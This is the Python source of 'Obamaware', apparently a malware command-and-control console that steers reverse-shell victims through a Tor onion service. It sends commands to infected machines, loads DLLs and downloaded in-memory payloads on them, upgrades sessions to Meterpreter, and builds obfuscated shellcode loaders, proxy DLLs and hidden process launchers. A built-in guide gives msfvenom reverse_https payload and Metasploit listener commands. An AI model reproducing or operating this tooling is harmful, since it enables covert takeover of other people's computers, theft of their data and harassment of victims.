from concurrent.futures import thread
import subprocess
import sys
import shlex
import ast
import threading

# Mapping: module → pip package
required_packages = {
    "requests": "requests",
    "paramiko": "paramiko",
    "pefile": "pefile",
    "Crypto": "pycryptodome",
    "socks": "pysocks"
}

for module_name, pip_name in required_packages.items():
    try:
        globals()[module_name] = __import__(module_name)
    except ImportError:
        print(f"[INFO] Installing missing package: {pip_name}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
        globals()[module_name] = __import__(module_name)  # retry import

# Import standard library modules (no need to install)
import cmd
import os
import sys
import time
import getpass
import base64
import json

ErrorSign = "\033[33m[!]\033[0m"
Success = "\033[32m[+]\033[0m"
Status = "\033[94m[*]\033[0m"

examples = """
------------------Request-Tor--------------------
[CMD] curl --socks5-hostname 127.0.0.1:9050 http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/
[PS1] iwr http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/ -Proxy 'socks5://127.0.0.1:9050'
End Tor: 
    taskkill /IM tor.exe /T /F

-------------Server-158.180.49.41----------------
EARDINUSE: 
    ubuntu@Obamaware1:~/Server$ pgrep -a micropython
    39168 micropython main.py
    ubuntu@Obamaware1:~/Server$ sudo kill 39168

-----------micropython-server-status-------------
systemctl status micropython-app.service

restart: 

    sudo systemctl daemon-reload

    sudo systemctl restart micropython-app.service

    journalctl -u micropython-app.service -f 

----------------Task-Management-------------------
list:
    tasklist /fi "imagename eq cmd.exe"

kill:
    taskkill /pid <PID> (/F force)

kill all:
    taskkill /im cmd.exe (/F force)

what started process:
    wmic process where "name='cmd.exe'" get ProcessId,CommandLine 

-----------------Start-Metasploit------------------
payload:
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=6762 -f c

listener:

    proxy-vm:

        sudo msfconsole
        use exploit/multi/handler
        set payload windows/x64/meterpreter/reverse_https
        set LHOST 0.0.0.0
        set LPORT 5555
        set ExitOnSession false
        exploit -j


play vid: 
    start "" "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --kiosk "file:///C:/Users/vikto/Obama_Projects/e.html" --edge-kiosk-type=fullscreen --no-first-run --disable-infobars

    start "" chrome --kiosk "file:///C:/Users/vikto/Obama_Projects/e.html" --edge-kiosk-type=fullscreen --no-first-run --disable-infobars

-----------------Unblock-Files---------------------
Unblock-File -Path "path"
Unblock-File -Path "path"

"""


class Obamaware(cmd.Cmd):
    intro = f"""   
 ▒█████   ▄▄▄▄    ▄▄▄       ███▄ ▄███▓ ▄▄▄       █     █░ ▄▄▄       ██▀███  ▓█████ 
▒██▒  ██▒▓█████▄ ▒████▄    ▓██▒▀█▀ ██▒▒████▄    ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
▒██░  ██▒▒██▒ ▄██▒██  ▀█▄  ▓██    ▓██░▒██  ▀█▄  ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
▒██   ██░▒██░█▀  ░██▄▄▄▄██ ▒██    ▒██ ░██▄▄▄▄██ ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
░ ████▓▒░░▓█  ▀█▓ ▓█   ▓██▒▒██▒   ░██▒ ▓█   ▓██▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
░ ▒░▒░▒░ ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
  ░ ▒ ▒░ ▒░▒   ░   ▒   ▒▒ ░░  ░      ░  ▒   ▒▒ ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
░ ░ ░ ▒   ░    ░   ░   ▒   ░      ░     ░   ▒     ░   ░    ░   ▒     ░░   ░    ░   
    ░ ░   ░            ░  ░       ░         ░  ░    ░          ░  ░   ░        ░  ░
               ░                                                                   
    
\033[32mWelcome to the Obamaware shell. \033[32mType help to list commands.\033[0m\n

{ErrorSign} Use env. variables with ^% to resolve at runtime if started from cmd.\n
{ErrorSign} Example: %TEMP%\ --> ^%TEMP^%\ .\n"""
    prompt = '\033[36mObamaware>\033[0m'
    file = None

    def __init__(self):
        super().__init__()
        self.revshell = False
        self.revname = ""
        self.cd = False
        self.do_clear("")
        self.inactivitycounter = 0
        self.configPath = "Config/config.md"

        self.session = requests.Session() # type: ignore
        self.session.trust_env = False  # optional – ignoriert System-Proxy-Variablen

        self.session.proxies.update({
        "http": "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050",
        })
        self.url = self.config(".onion-url")
        self.body = "USER ### GET"

        self.ssh_client = None

        self.paloadnameMeterpreter = "PAYLOAD_NAME"

        self.read_values()

        self.revshellActive = False
    
    def read_values(self):
        self.ssh_host = self.config("ssh_ipv4")
        self.ssh_port = self.config("ssh_port")
        self.ssh_user = self.config("ssh_user")
        self.uninstallDir = self.config("uninstall_dir")

    def config(self, name=None, value=None):
        if not os.path.exists(os.path.dirname(self.configPath)):
            self.do_cmd(f"mkdir {os.path.dirname(self.configPath)}")

        if not os.path.exists(self.configPath):
            with open(self.configPath, "w") as f:
                f.write("""+----------------------++-----------------------------------------------------------------------------------------------+
| name                 || value                                                                                         |
+----------------------++-----------------------------------------------------------------------------------------------+
| ssh_ipv4             || not_set                                                                                       |
| ssh_user             || ubuntu                                                                                        |
| ssh_port             || 22                                                                                            |
| .onion-url           || not_set                                                                                       |
| uninstall_dir        || not_set                                                                                       |
+----------------------++-----------------------------------------------------------------------------------------------+""")
        
        if not name and not value:
            with open(self.configPath, "r") as f:
                return "".join(f.readlines())

        if not value:
            with open(self.configPath, "r") as f:
                lines =  f.readlines()
                for line in lines:
                    if name in line:
                        left, right = line.split("|| ")
                        return right.strip(" |\n")
            
        with open(self.configPath, "r",) as f:
            lines =  f.readlines()
            
        with open(self.configPath, "w+") as f:
            for line in lines:
                if name in line:
                    left, right = line.split("|| ")

                    line = left + "|| " + value
                    for i in range(len(right.strip("\n")) - len(value.replace("\\", "\\\\")) - 1):
                        line += " "
                    line += "|\n"
                f.write(line)

        self.read_values()
        with open(self.configPath, "r") as f:
            return "".join(f.readlines())

    
    def do_options(self, line):
        print(self.config())
        print(f"{Status} Use \"set \033[94m<name> <value>\"\033[0m to set a value")
    
    def do_set(self, line):
        args = [i.strip() for i in line.strip().split(' ') if i]
        if len(args) == 2:
            print(self.config(args[0], args[1]))
        elif len(args) == 1:
            print(self.config(args[0]))
        else:
            print(self.config())

    def do_local_listener(self, lines):
        print(f"{Status} Starting listener...\n{Status}run:\n{Status}use exploit/multi/handler\n{Status}set payload windows/x64/meterpreter/reverse_https\n{Status}set LHOST 0.0.0\n{Status}set LPORT 5555\n{Status}set ExitOnSession false\n{Status}exploit -j")
        os.system('taskkill /IM msfconsole.exe /F')
        os.system("rmdir msf /s /q")
        os.system("mkdir msf")
        os.system("cd msf")
        os.system("msfconsole")
    
    def do_listener(self, lines):
        print(f"{Status} Starting listener...\n")
        argsjson = [("sudo pkill -9 -f msfconsole", 60),
                ("mkdir msf", 60),
                ("cd msf", 60),
                ("python3 -m http.server 8080 --bind 0.0.0.0 &", 60, "Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ..."),
                ("sudo msfconsole", 120, "msf >"), 
                ("use exploit/multi/handler", 5, "msf exploit(multi/handler) >"), 
                ("set payload windows/x64/meterpreter/reverse_https", 5, "msf exploit(multi/handler) >"),
                ("set LHOST 0.0.0.0", 5, "msf exploit(multi/handler) >"), 
                ("set LPORT 5555", 5, "msf exploit(multi/handler) >"), 
                ("set ExitOnSession false", 5, "msf exploit(multi/handler) >"), 
                ("exploit -j", 999999999999999999999999999, "Without a database connected that payload UUID tracking will not work!"),
                ("sessions", 60),
                ("sessions -i 1", 60)]
        args = [self.ssh_host, self.ssh_user, self.ssh_port]
        
        if self.launch_py("./SSH.py", args, argsjson) != 0:
            print(f"{ErrorSign} meterpreter listener startup failed.")
            print(f"{ErrorSign} Try \"options\" to set a .onion address")
            print(f"{ErrorSign} Try \"options\" to set an ipv4 address")
            return 1
    
    def do_play_vid(self, line):
        args = [i.strip() for i in line.strip().split(' ') if i]

        if len(args) == 0:
            path = input("Path to video-file (on victim): ")
        else: path = args[0]

        command = """start "" "PATH" """.replace("PATH", path)
        

        if "guide" in line:
            print(f"""\n{Status}run \nstart "" "PATH" """)
            return

        self.send_request("POST", self.revshell, command)
        self.send_request_loop(self.revshell)
    
    def do_upload(self, line):
        args = [i.strip() for i in line.strip().split(' ') if i]
        if len(args) != 2:
            print(f"{ErrorSign} usage: upload <local_path> <remote_path>")
            return
        self.do_cmd(f"scp -r {args[0]} {self.ssh_user}@{self.ssh_host}:{args[1]}")
    
    def do_download(self, line):
        args = [i.strip() for i in line.split(' ') if i]
        if len(args) != 2:
            print(f"{ErrorSign} usage: download <remote_path> <local_path>")
            return

        remote_path = args[0]
        local_path = args[1]

        # Always quote paths to support spaces
        rp = f"\"{remote_path}\""
        lp = f"\"{local_path}\""

        # Always use -r — scp works fine for files OR directories with -r
        cmd = f"scp -r {self.ssh_user}@{self.ssh_host}:{rp} {lp}"

        self.do_cmd(cmd)

    def launch_py(self, path, args, argsjson):
        print(f"{Status} launching python file...")
        python_exe = sys.executable
        script_path = path

        argsjson = json.dumps(argsjson)

        argsjson = json.dumps(argsjson).encode("utf-8")
        argsjson = base64.b64encode(argsjson).decode("ascii")

        args.append(argsjson)

        CREATE_NEW_CONSOLE = 0x00000010

        try:
            process = subprocess.Popen(
                [python_exe, script_path] + args,
                creationflags=CREATE_NEW_CONSOLE
            )
            return 0
        except Exception as e:
            print(f"{ErrorSign} python file failed to start: {e}")
            return e
        
    def do_ssh_connect(self, line):
        """Connect to SSH server"""
        try:
            self.ssh_client = paramiko.SSHClient() # type: ignore
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # type: ignore
            password = getpass.getpass("ssh password: ")
            self.ssh_client.connect(self.ssh_host, port=self.ssh_port, username=self.ssh_user, password=password)
            print(f"{Success} Connected to {self.ssh_host}")
        except Exception as e:
            print(f"{ErrorSign} SSH connection failed: {e}")
            print(f"{ErrorSign} Try \"options\" to set a host")

    def do_ssh(self, command):
        """Send a command over SSH. Usage: ssh <command>"""
        if not self.ssh_client:
            self.do_ssh_connect("")
        if not self.ssh_client:
            print(f"{ErrorSign} Not connected. Use 'connect' first.")
            return

        try:
            # Allocate a PTY
            stdin, stdout, stderr = self.ssh_client.exec_command(command, get_pty=True)

            output = stdout.read().decode()
            error = stderr.read().decode()
            print(output)
            if error:
                print(f"Error: {error}")
        except Exception as e:
            print(f"Failed to execute command: {e}")

    def do_exit(self, arg):
        """Exit the CLI"""
        if self.ssh_client:
            self.ssh_client.close()
        print("Bye!")
    
    def do_guide(self, line):
        print(examples)
    
    def send_request_loop(self, name, timeout=None, output=True):
        run = True
        while run:
            if not self.revshell:
                self.run = False
                return
            try:
                resp = self.session.post(self.url + "/cdr", data=self.body.replace("USER", name), timeout=6)
                response = resp.text.split(" ### ", 1)
                if "output" in response[0]:
                    if len(response) > 1:
                        if "__NO_PAYLOAD__" not in response[1] and "__NO_PRINT__" not in response[1]:
                            self.inactivitycounter = 0
                            if self.cd:
                                self.cd = False
                                self.prompt = f'\033[36m{response[1].strip()}>\033[0m'
                                self.run = False
                                return
                            else:
                                for line in response[1].strip("\n").split("\n"):
                                    if output:
                                        print(f"{line}")
                                print("\n")
                            return response[1].strip()
                if resp.text == "output ###" and not self.cd:
                    print(f"{Success} Command executed successfully with no output.\n")
                    return "__NO_OUTPUT__"
                
                if timeout:
                    if self.inactivitycounter >= timeout:
                        self.inactivitycounter = 0
                        self.do_EOF("")
                        print(f"{ErrorSign} No response from client. Reverse shell stopped.\n")
                    self.inactivitycounter += 1
            except requests.RequestException as e: # type: ignore
                print(f"{ErrorSign} receiving: ", e)
            time.sleep(3)

    def do_cd(self, line, timeout=None):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        self.cd = True
        if args:
            self.send_request("POST", self.revname, f"cd {args}", cd=True).strip("\r\n")
            self.send_request_loop(self.revname, timeout)
        else:
            self.send_request("POST", self.revname, "cd ", cd=True)
            self.send_request_loop(self.revname, timeout)

    def send_request(self, mode, name, cmd=None, cd=False, custom=False, timeout=None, command="reply = 'no command'"):
        if mode == "GET":
            try:
                if not self.revshell:
                    self.revshell = True
                    self.revname = name
                    print(f"{Status} Reverse shell started. Type 'exit' or 'EOF' to stop.")
                    print(f"{Status} Type EOT<< to beginn a multiline command and EOT to send it.")
                    print(f"{Status} Retrieving working directory...")
                    print(f'{ErrorSign} If nothing happens, the client might be offline...')
                self.do_cd("", 10)  # Get initial directory
            except requests.RequestException as e: # type: ignore
                print(f"{ErrorSign} request failed:", e)
                print(f"{ErrorSign} Try \"options\" to set a .onion address")
        elif mode == "POST":
            if cd and cmd:
                try:
                    resp = self.session.post(self.url + "/cdr", data=self.body.replace("USER", name).replace("GET", "__CD__ ### " + cmd), timeout=timeout)
                    return resp.text
                except requests.RequestException as e: # type: ignore
                    print("request failed:", e)
                    return
            if custom:
                try:
                    if not cmd:
                        cmd = ""
                    resp = self.session.post(self.url + "/cdr", data=self.body.replace("USER", name).replace("GET", custom + cmd), timeout=timeout)
                    return resp.text
                except requests.RequestException as e: # type: ignore
                    print("request failed:", e)
                    return
            elif cmd:
                try:
                    if cmd.startswith("start"):
                        cmd += "\necho __SEND_NO_OUTPUT__"
                    resp = self.session.post(self.url + "/cdr", data=self.body.replace("USER", name).replace("GET", "__EXECUTE__ ### " + cmd), timeout=timeout)
                    return resp.text
                except requests.RequestException as e: # type: ignore
                    print("request failed:", e)
                    return
        elif mode == "execute":
            try:
                resp = self.session.post(self.url + "/Aoukgbf92LuhdaolC4B6i(9721klja2", command, timeout=timeout)
                if resp.text:
                    return resp.text
            except requests.RequestException as e: # type: ignore
                print(f"{ErrorSign} request failed:", e)
                print(f"{ErrorSign} Try \"options\" to set a .onion address")
        elif mode == "auth":
            try:
                data = self.serverKey
                resp = self.session.post(self.url + "/password", data, timeout=timeout)
                if resp:
                    print(resp.text)
            except requests.RequestException as e: # type: ignore
                print(f"{ErrorSign} request failed:", e)
                print(f"{ErrorSign} Try \"options\" to set a .onion address")
        
    # ----- basic shell commands -----
    def multiline_command(self):
        command = ""
        line = ""
        while line.strip() != "EOT":
            line = input(">>")
            command += line + "\n"
        return command[:-4]
    
    def do_eof(self, line):
        self.revshell = False
        self.revname = None
        self.revshellActive = False
        if self.prompt == '\033[36mObamaware>\033[0m':
            return True
        else:
            self.prompt = '\033[36mObamaware>\033[0m'
    
    def do_EOF(self, line):
        self.revshell = False
        self.revname = None
        self.revshellActive = False
        if self.prompt == '\033[36mObamaware>\033[0m':
            return True
        else:
            self.prompt = '\033[36mObamaware>\033[0m'

    def do_exit(self, line):
        self.revshell = False
        self.revname = None
        self.revshellActive = False
        if self.prompt == '\033[36mObamaware>\033[0m':
            return True
        else:
            self.prompt = '\033[36mObamaware>\033[0m'

    def do_clear(self, line):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def do_cls(self, line):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def build(self):
        if not os.path.exists("build"):
            os.system("mkdir build")

    def do_proxy(self, line):
        print("")
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        self.build()
        subprocess.run(["python", "../ObamaTools.py", "--proxy-dll"] + shlex.split(args), cwd="build", shell=False)
    
    def do_loader(self, line):
        print("")
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        self.build()
        subprocess.run(["python", "../ObamaTools.py", "--shellcode-loader"] + shlex.split(args), cwd="build", shell=False)
    
    def do_process_starter(self, line):
        print("")
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        self.build()
        subprocess.run(["python", "../ObamaTools.py", "--process-starter"] + shlex.split(args), cwd="build", shell=False)
    
    def do_mapper(self, line):
        print("")
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        self.build()
        subprocess.run(["python", "../ObamaTools.py", "--manual-mapper"] + shlex.split(args), cwd="build", shell=False)
    
    def do_dll_loader(self, line):
        print("")
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        self.build()
        subprocess.run(["python", "../ObamaTools.py", "--dll-loader"] + shlex.split(args), cwd="build", shell=False)

    def do_cmd(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        os.system(line)


    def do_revshell(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        if args == "list":
            resp = self.send_request("execute", self.revname, command="reply = self.cdr_last_seen")
            resp = ast.literal_eval(resp)
            for name, last_seen in resp.items():
                print(f"{name} | Last seen: {last_seen}")
            self.send_request_loop(self.revname)
        else:
            self.send_request("GET", args)
            self.send_request_loop(self.revname)
            self.revshellActive = True
    
    def list_shell_names(self):
        pass
    

    def do_help(self, line):
        print("\n")
        print("  \033[32mssh_connect\033[0m - Connect to configured SSH server (prompts for password)")
        print("  \033[32mssh\033[0m \033[94m<command>\033[0m - Execute single command over SSH")
        print("  \033[32mssh_shell\033[0m - Open interactive SSH shell (type 'exit' to return)\n")

        print("")
        print("  \033[32mproxy\033[0m \033[94m<proxy_dll_path> <payload_dll> <payload_main> [payload_args] [other_calls ...]\033[0m")
        print("        Generate a proxy DLL source that forwards exports to the target DLL")
        print("        and additionally calls a payload DLL export with optional arguments.")
        print("        other_calls: optional extra \"dll func [args]\" triplets to call.\n")

        print("  \033[32mmapper\033[0m \033[94m<url_of_dll> <main_func_name> [-a]\033[0m")
        print("        Generate a manual mapper DLL source that downloads a DLL from a URL,")
        print("        maps it in memory, and calls the specified export function.")
        print("        With -a/--args, runtime args (injecturl_one, inecturl_two, main_func_name) will be passed.\n")

        print("  \033[32mdll_loader\033[0m \033[94m<dll_path> <func_name>\033[0m")
        print("        Generate a standalone C++ loader program that LoadLibraryA's a DLL")
        print("        and calls its specified exported function.\n")

        print("  \033[32mloader\033[0m \033[94m<shellcode_path> <xor_key> <output_cpp>\033[0m")
        print("        Create a C++ shellcode loader embedding XOR-obfuscated shellcode.")
        print("        \033[94m-d\033[0m / \033[94m--dll\033[0m : Produce a DLL-style loader instead of EXE-style WinMain.\n")

        print("  \033[32mprocess_starter\033[0m \033[94m<executable_path> [executable_path...]\033[0m")
        print("        Generate a C++ program that launches one or more executable or batch files hidden.")
        print("        Calls main_func(const char* file, bool batmode = true, const char* exeArgs = nullptr, waitfor = false) in DLL mode.")
        print("        \033[94m-d\033[0m / \033[94m--dll\033[0m : Produce a DLL-style starter instead of EXE-style WinMain.\n")

        print("")
        print("  \033[32mrevshell\033[0m \033[94m<name>\033[0m - Connect to reverse shell target")
        print("         \033[94mlist\033[0m - List all active reverse shell clients")

        print("  \033[32mmeterpreter\033[0m - Upgrade revshell to full Meterpreter (downloads payload, ncat, etc.)")
        print("  \033[32mrm_meterpreter\033[0m - Remove Meterpreter resources from %TEMP%/.tmp6cHb1Rn\n")

        print("  \033[32mplay_vid\033[0m - Play video in fullscreen kiosk mode (auto-detects Chrome/Edge)")
        print("  \033[32mlistener\033[0m - Start Metasploit listener on SSH server (HTTP + handler)\n")

        print("  \033[32moptions\033[0m - Show current configuration")
        print("  \033[32mset\033[0m \033[94m<name> <value>\033[0m - Set config value | \033[94m<name>\033[0m - Show current value\n")

        print("  \033[32mcd\033[0m \033[94m<path>\033[0m - Change directory on target | no args = show current\n")

        print("  \033[32mclear / cls\033[0m - Clear console")
        print("  \033[32mexit / EOF\033[0m - Exit Obamaware (Ctrl+D or 'exit')")
        print("  \033[32mhelp\033[0m - Show this help message")
        print("  \033[32mguide\033[0m - Show example commands (Tor, Metasploit, etc.)")
        print("  \033[32mcmd\033[0m \033[94m<command>\033[0m - Run local system command\n")

    
    def do_uninstall(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        if not args:
            args = self.uninstallDir
        if self.revshell:
            self.send_request("POST", self.revname, custom="__UNINSTALL__ ### " + args)
            self.send_request_loop(self.revname)
        else:
            print(f"{ErrorSign} Please connect to a reverse shell first.")
    
    def do_msg(self, line):
        args = [i.strip() for i in line.strip().split(' ') if i]
        argstr = ' '.join(args)
        if len(args) == 0:
            print(f"{ErrorSign} Usage: msg <error/info/warning> <message>")
            return
        if len(args) < 2:
            argstr = "info " + ' '.join(args)
        if self.revshell:
            self.send_request("POST", self.revname, custom="__MSG__ ### " + argstr)
            self.send_request_loop(self.revname)
        else:
            print(f"{ErrorSign} Please connect to a reverse shell first.")
    
    def do_quit(self, line):
        if self.revshell:
            name = self.revname
            self.send_request("POST", name, custom="__QUIT__")
            print(f"{Status} Sent termination signal.")
            self.do_eof("")
            time.sleep(10)
            self.send_request("POST", name, "echo revshell %USERPROFILE% running")
        else:
            print(f"{ErrorSign} Please connect to a reverse shell first.")
    
    def do_dll(self, line):
        args = [i.strip() for i in line.strip().split(' ') if i]
        if len(args) < 2:
            print(f"{ErrorSign} Usage: dll <path_to_dll_on_victim> <main_func_name>")
            return
        args[0] = args[0].replace("\\", "\\\\").replace("/", "\\\\").strip("\"\'")
        args = ' '.join(args)
        if self.revshell:
            self.send_request("POST", self.revname, custom="__LOAD_DLL__ ### " + args)
            self.send_request_loop(self.revname)
        else:
            print(f"{ErrorSign} Please connect to a reverse shell first.")
    
    def do_map(self, line):
        args = [i.strip() for i in line.strip().split(' ') if i]
        if len(args) < 2:
            print(f"{ErrorSign} Usage: dll <path_to_mapper_on_victim> <dll_main_func_name> <sub_url> <main_func_name>")
            return
        args[0] = args[0].replace("\\", "\\\\").replace("/", "\\\\").strip("\"\'")
        args.insert(2, self.url.split("/")[-1])
        args = ' '.join(args)
        if self.revshell:
            self.send_request("POST", self.revname, custom="__LOAD_MAPPER__ ### " + args)
            self.send_request_loop(self.revname)
        else:
            print(f"{ErrorSign} Please connect to a reverse shell first.")
    
    def do_upgrade(self, line):

        def delayed_send():
            time.sleep(12)
            self.send_request("POST", self.revname, custom="echo Downgrade successful.")

        if self.revshell:
            self.send_request("POST", self.revname, custom="__UPGRADE__")
            print(f"{ErrorSign} Client will connect in at least 10 seconds...")

            proc = subprocess.Popen(["ws.exe"], shell=True)

            thread = threading.Thread(target=delayed_send, daemon=True)
            thread.start()

            proc.wait()
            print("\n")
        else:
            print(f"{ErrorSign} Please connect to a reverse shell first.")

    def do_downgrade(self, line):
        if self.revshell:
            self.send_request("POST", self.revname, custom="__DOWNGRADE__ ")
        else:
            print(f"{ErrorSign} Please connect to a reverse shell first.")
    
    def do_threads(self, line):
        if self.revshell:
            self.do_thread(line)
        else:
            print(f"{ErrorSign} Please connect to a reverse shell first.")
    
    def do_thread(self, line):
        if self.revshell:
            args = [i.strip() for i in line.strip().split(' ') if i]

            if len(args) == 0:
                args = ["get"]
            elif len(args) > 2:
                print(f"{ErrorSign} Usage: thread <name/id/get> <get/suspend/terminate/resume>")
                return

            # Determine if first arg is an int (ID) or name
            if args[0].isdigit():
                args.insert(0, "int")  # ID
            else:
                args.insert(0, "str")  # Name

            # Map type to id/name
            if args[0] == "int":
                args[0] = "id"
            else:
                args[0] = "name"
            if " ".join(args) == "name get":
                args = ["get"]

            self.send_request("POST", self.revname, custom="__THREADS__ ### " + " ".join(args))
            self.send_request_loop(self.revname)
        else:
            print(f"{ErrorSign} Please connect to a reverse shell first.")

        
        

    
    def default(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        send = True
        if self.revshell:
            if args == "EOT<<":
                args = self.multiline_command()
            elif args == "auth":
                self.send_request("auth", self.revname)
                self.send_request_loop(self.revname)
                send = False
            if send:
                self.send_request("POST", self.revname, args)
                self.send_request_loop(self.revname)
        else:
            print(f"{ErrorSign} Unknown command: {line}. Type 'help' to list commands.")
    
    def cmdloop(self, intro=None):
        print(intro or self.intro)
        while True:
            try:
                # This reads input and executes commands
                super().cmdloop(intro="")
                break  # Normal exit
            except KeyboardInterrupt:
                print(f"\n{ErrorSign} KeyboardInterrupt. Use 'exit' or 'EOF' to quit")
                self.cd = False
                if not self.revshellActive:
                 self.revshell = False
                continue  # Go back to prompt without quitting


def remove_prefix(s, prefix):
    return s[len(prefix):] if s.startswith(prefix) else s

if __name__ == '__main__':
    Obamaware().cmdloop()